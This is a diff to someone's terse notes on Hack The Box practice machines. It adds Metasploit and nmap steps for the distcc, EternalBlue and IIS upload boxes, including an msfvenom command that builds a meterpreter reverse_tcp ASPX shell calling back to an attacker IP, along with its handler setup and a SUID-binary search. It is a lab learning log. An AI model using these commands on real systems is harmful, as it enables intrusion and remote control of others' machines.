@@ -68,9 +68,45 @@ getsystem attempts to privesc ( might be a bit reckless)
 
 ## Lame
 nmap --script vuln -p3632 10.10.10.3
+
 3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+
 distcc indicated as vulnerable, msf unix/misc/distcc_exec gives shell
-find / -user root -perm -4000 -print 2>/dev/null      ( find binaries with root privs) 
+
+find / -user root -perm -4000 -print 2>/dev/null      ( find binaries with root privs)
+
 elevate privileges with nmap ( should learn something new instead...)
+
 https://pentestlab.blog/category/privilege-escalation/  
+
+## blue
+as name indicates
+
+nmap --script vuln -p445 10.10.10.3   reports windows/smb/ms17_010_eternalblue)
+
+didnt work on first try, resetted machine, tried other exploits, but this one eventually worked. 
+
+## devel
+IIS7 with file upload by FTP. 
+
+making payloads with msfvenom
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.36 LPORT=4444 -f aspx -o shell.aspx 
+
+Needed write-up because new to IIS shells, and windows privesc. 
+
+set payload windows/meterpreter/reverse_tcp
+
+msf5 > use exploit/multi/handler
+
+msf5 exploit(multi/handler) > set lhost 10.10.14.36
+
+msf5 exploit(multi/handler) > set lport 4444
+
+background and session management.. anyway all thanks to https://x64.moe/hackthebox%20walkthrough%20:%20devel/
+
+use post/multi/recon/local_exploit_suggester    ## for local exploits, new for me
+
+
+
 
